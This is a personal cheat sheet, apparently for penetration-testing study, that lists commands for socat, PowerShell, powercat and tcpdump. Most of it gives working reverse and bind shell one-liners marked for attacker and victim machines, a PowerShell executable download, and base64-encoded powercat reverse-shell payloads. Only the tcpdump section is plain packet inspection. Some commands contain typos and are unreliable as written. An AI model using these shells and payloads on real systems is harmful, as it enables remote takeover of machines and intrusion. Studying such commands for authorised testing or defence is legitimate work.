# Remember

## SOCAT
1. Interacting with a remote service.
`socat - TCP4:<IP>:<PORT>`

2. Starting a listener, creating a simple chat. Note: Need to be sudo to bind listener or privilege ports. Use the command in number 1 to interact with the server.
`sudo socat TCP4:LISTEN:<PORT> STDOUT` -- server

3. Transferring files. Fork is used to create a child process once the client connect to the listener.
`sudo socat TP4:LISTEN:<PORRT>,fork file:secret.txt`  -- server
`socat TCP4:<IP>:<PORT> file:secret.txt,create` -- client

4. Socat reverse shells.
`socat -d -d TCP4-LISTEN:443 STDOUT` -- attacker's machine
`socat TCP4:<IP>:<PORT> EXEC:/bin/bash` -- victim's machine

5. Socat encrypted  bind shells. req and -x509 (creates a self-signed certificates), -nodes(stored the key unencrypted) -days (validity)
- First generate a certificate.
`openssel req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt`
- Convert the bind shell key and bind shell ccertificate into a .pem file.
A file that socat accepts.
`cat bind_shell.key bind_shell.crt > bind_shell.pem`
- Create a listener or server.verify=0(disables ssl verification)
`sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash`
- Connect to the server.
`socat - OPENSSL:<IP>:<PORT>,verify=0`

## POWERSHELL 

1. Transfer files.
`powershell -c "(new-object System.Net.WebClient).DownloadFile('http://example.com/example.exe','C:\Users\ninja\Desktop\example.exe')"`

2. Reverse Shells
- Set up netcat listener.
`sudo nc -lvnp 443`
- Send reverse shell.
`powershell -c "$client = New-Object System.Net.Sockets.TCPCLient('<IP>',<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush();}$client.close();"`

3. Bind Shells
`powershell -c "$listener = New-Object System.Net.Sockets.TCPListner('0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}$client.Close();$listener.Stop()"`


## POWERCAT
1. File transfer.
`powercat -c <IP> -p <PORT> -i <filetotransfer>` --sender
`sudo nc -nlvp 443 > <filename>` -- receiver

2. Reverse Shells
`sudo nc -lvp 443` --attacker
`powercat -c <IP> -p <PORT> -e cmd.exe` -- victim

3. Bind Shells
`powercat -l -p 443 -e cmd.exe` -- victim or server
`nc -nv <IP> <PORT>` -- attacker or client

4. Powercat stand-alone payloads.
- create a reverse shell payload. 
`powercat -c <IP> -p <PORT> -e cmd.exe > reverseshell.ps1`
- create a listener.
`sudo nc -nlvp 443`

- encoded payload, use "-ge"
`powercat -c <IP> -p <PORT> -ge cmd.exe > encodedreverseshell.ps1`
- to run the encoded payload script.
`powershell.exe -E "<base64encodedscript>"`


## TCPDUMP
1 . inspect a pcap file
`tcpdump -r <file.pcap>`

2. inspect a specific host (e.g. src address) on pcap file 
`tcpdump -n src host <IP> -r <file.pcap>`

3. inspect a specific port on pcap file 
`tcpdump -n port <portnumber> -r file.pcap<>`

4. inpect in a hex and ascii format
`tcpdump -nX -r <file.pcap | less>`

5. Advanced Filtering (e.g. ACK and PUSH bit set)
- 
`echo "$((2#00011000))"` -- output fed to tcpdump
- note: starts at index zero, in this example 14 and 15 byte
`tcpdump -A -n 'tcp[13] = 24' -r <file.pcap>`